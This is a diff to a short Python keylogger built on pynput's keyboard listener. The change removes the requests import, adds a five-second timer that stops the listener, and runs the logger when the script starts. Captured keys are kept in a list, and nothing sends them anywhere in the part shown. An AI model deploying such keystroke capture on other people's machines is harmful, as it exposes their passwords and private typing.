@@ -1,12 +1,12 @@
-import pynput
+import threading
 from pynput.keyboard import Key, Listener
-import requests
-
 
 class Keylogger:
     def __init__(self):
         self.count = 0
         self.keys = []
+        self.timer = threading.Timer(5, self.stop_keylogger)
+        self.listener = None
 
     def on_press(self, key):
         self.keys.append(key)
@@ -28,9 +28,17 @@ class Keylogger:
 
     def on_release(self, key):
         if key == Key.esc:
+            self.timer.cancel()
             return False
 
-    def keylogger(self):
-        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
-            listener.join()
+    def stop_keylogger(self):
+        self.listener.stop()
 
+    def keylogger(self):
+        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
+        self.timer.start()
+        self.listener.start()
+        self.listener.join()
+
+k = Keylogger()
+k.keylogger()
